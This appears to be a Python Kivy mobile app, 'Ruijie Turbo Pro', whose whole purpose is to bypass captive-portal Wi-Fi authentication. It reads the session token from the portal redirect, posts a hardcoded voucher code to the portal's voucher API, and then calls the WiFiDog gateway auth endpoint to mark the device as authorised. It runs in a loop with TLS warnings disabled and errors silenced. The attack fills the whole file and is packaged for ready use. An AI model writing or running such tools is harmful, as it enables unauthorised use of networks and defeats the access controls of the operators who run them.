import threading
import requests
import urllib3
import time
from urllib.parse import urlparse, parse_qs
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.clock import Clock

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class TurboApp(App):
    def build(self):
        self.root = BoxLayout(orientation='vertical', padding=20, spacing=15)
        self.status_label = Label(text="Status: [color=00FF00]Ready[/color]", markup=True, font_size='18sp')
        self.start_btn = Button(text="START BYPASS", size_hint=(1, 0.2), background_color=(0, 0.7, 0, 1))
        self.start_btn.bind(on_press=self.start_process_thread)
        
        self.root.add_widget(Label(text="Ruijie Turbo Pro", font_size='24sp', color=(0, 1, 1, 1)))
        self.root.add_widget(self.status_label)
        self.root.add_widget(self.start_btn)
        self.running = False
        return self.root

    def start_process_thread(self, instance):
        if not self.running:
            self.running = True
            threading.Thread(target=self.main_logic, daemon=True).start()

    def main_logic(self):
        session = requests.Session()
        while self.running:
            try:
                r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
                if r.status_code == 204:
                    Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', "[color=00FF00]Online[/color]"), 0)
                else:
                    parsed = urlparse(r.url)
                    params = parse_qs(parsed.query)
                    sid = params.get('sid', [None])[0] or params.get('token', [None])[0]
                    if sid:
                        # Voucher API Activation
                        session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", 
                                     json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                        # Bypass Packet Sending
                        gw_addr = params.get('gw_address', ['192.168.110.1'])[0]
                        gw_port = params.get('gw_port', ['2060'])[0]
                        session.get(f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}", timeout=5)
                        Clock.schedule_once(lambda dt: setattr(self.status_label, 'text', "[color=00FFFF]Bypass Active[/color]"), 0)
            except: pass
            time.sleep(5)

if __name__ == '__main__':
    TurboApp().run()
